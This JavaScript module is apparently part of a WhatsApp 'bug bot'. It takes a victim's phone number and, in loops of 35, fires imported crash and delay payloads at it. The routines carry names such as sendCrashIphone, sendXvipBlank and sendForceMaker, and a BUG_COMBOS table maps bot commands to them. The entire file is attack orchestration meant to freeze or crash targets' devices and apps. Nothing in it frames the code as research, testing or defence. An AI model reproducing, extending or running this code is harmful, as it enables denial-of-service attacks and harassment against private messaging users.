import { sleep, parsePhoneTarget } from "./helpers.js";
import { DelayV1, DelayV2, DelayV3, DelayV4, DelayV5, DelayHard } from "./delay.js";
import { lahora, iosCtt, fiOSNew, UiOverload } from "./ios.js";

export function requirePhoneTarget(raw) {
  const target = parsePhoneTarget(raw);
  if (!target) throw new Error("Syntax Error. Contoh: 628xxx (tanpa awalan 0)");
  return target;
}

export async function sendDelayMaker(sock, target, { loops = 35 } = {}) {
  for (let i = 0; i < loops; i++) {
    await DelayHard(sock, target);
    await sleep(500);
    await DelayHard(sock, target);
    await sleep(500);
  }
}

export async function sendXvipBlank(sock, target, { loops = 35 } = {}) {
  for (let i = 0; i < loops; i++) {
    await lahora(sock, target);
    await sleep(500);
    await UiOverload(sock, target);
    await sleep(500);
    await DelayHard(sock, target);
    await sleep(500);
  }
}

export async function sendCrashIphone(sock, target, { loops = 35 } = {}) {
  for (let i = 0; i < loops; i++) {
    await fiOSNew(sock, target);
    await sleep(500);
    await iosCtt(sock, target);
    await sleep(500);
  }
}

export async function sendForceMaker(sock, target, { loops = 35 } = {}) {
  for (let i = 0; i < loops; i++) {
    await DelayV1(sock, target);
    await sleep(500);
    await DelayV2(sock, target);
    await sleep(500);
    await DelayV3(sock, target);
    await sleep(500);
    await DelayV4(sock, target);
    await sleep(500);
    await DelayV5(sock, target);
    await sleep(500);
  }
}

export const sendC1 = sendDelayMaker;

export const BUG_COMBOS = {
  delaymaker: sendDelayMaker,
  xvipblank: sendXvipBlank,
  crashiphone: sendCrashIphone,
  forcemaker: sendForceMaker,
  c1: sendC1,
};
